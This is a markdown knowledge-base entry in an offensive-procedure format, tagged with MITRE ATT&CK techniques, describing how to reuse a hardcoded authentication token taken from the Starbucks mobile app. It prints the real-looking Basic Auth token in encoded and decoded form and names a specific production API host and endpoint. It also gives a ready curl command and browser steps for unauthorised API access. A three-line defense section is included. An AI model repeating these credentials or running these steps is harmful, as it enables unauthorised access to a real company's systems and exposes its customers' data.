---
id: proc-extract-reuse-auth-token
tags:
  - credential-extraction
  - auth-bypass
  - static-token
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/get-mobileinbox-limit]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:32:20.537Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Default Accounts]]'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Unsecured Credentials]]'
---
# Extract-and-Reuse-Static-Auth-Token

## Summary

This procedure extracts a static Basic Auth token from intercepted app requests and reuses it in a browser to bypass app-specific authentication, granting direct API access.

## Description

The Starbucks app uses a hardcoded static token (Basic QVBSTlhXTFpUUTo4NGY0NDlmMWYzOWEyMDUz) without per-user validation, allowing reuse in any client like a browser after interception via the unpinned /MobileInbox/ path.

## Requirements

1. Captured request from Burp with Authorization header.
2. Browser with developer tools or header-modifying extension (e.g., ModHeader).
3. Target URL: https://crmproxy.protel.com.tr.

## Defense

Defensive measures and detection strategies:

- Use dynamic, per-session tokens instead of static creds.
- Implement IP/user-agent validation on API calls.
- Rate-limit and log anomalous auth attempts from non-app sources.

## Objectives

1. Identify and copy the static token.
2. Inject token into browser requests.
3. Validate bypass by accessing protected endpoints.

## Instructions

### Step 1: Inspect Intercepted Request

**Context**: Locate the Authorization header in Burp.

In Burp's HTTP history, select the /MobileInbox/ request and view headers.

> Token: Authorization: Basic QVBSTlhXTFpUUTo4NGY0NDlmMWYzOWEyMDUz (decodes to APRNXWLZYT:84f449f1f39a2053).

### Step 2: Test in Browser

**Context**: Attempt direct access to trigger auth popup, then add token.

Navigate to https://crmproxy.protel.com.tr/api/v1/MobileInbox/Limit/20 in browser.

> Popup appears; cancel and use dev tools to add header, or execute [[commands/get-mobileinbox-limit]] via curl in terminal.

```bash
curl -k -H "Authorization: Basic QVBSTlhXTFpUUTo4NGY0NDlmMWYzOWEyMDUz" https://crmproxy.protel.com.tr/api/v1/MobileInbox/Limit/20
```

> Expected: 200 OK with JSON data; no auth required.

### Step 3: Apply to All Requests

**Context**: Set token globally for API exploration.

In browser extensions, add the Authorization header to all requests to crmproxy.protel.com.tr.

> Success: Seamless access without further auth.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques

- [[Default Accounts]] Default Accounts

## Commands Used

- [[commands/get-mobileinbox-limit]]

## Tools Used

- None

## Tags

- credential-extraction
- auth-bypass
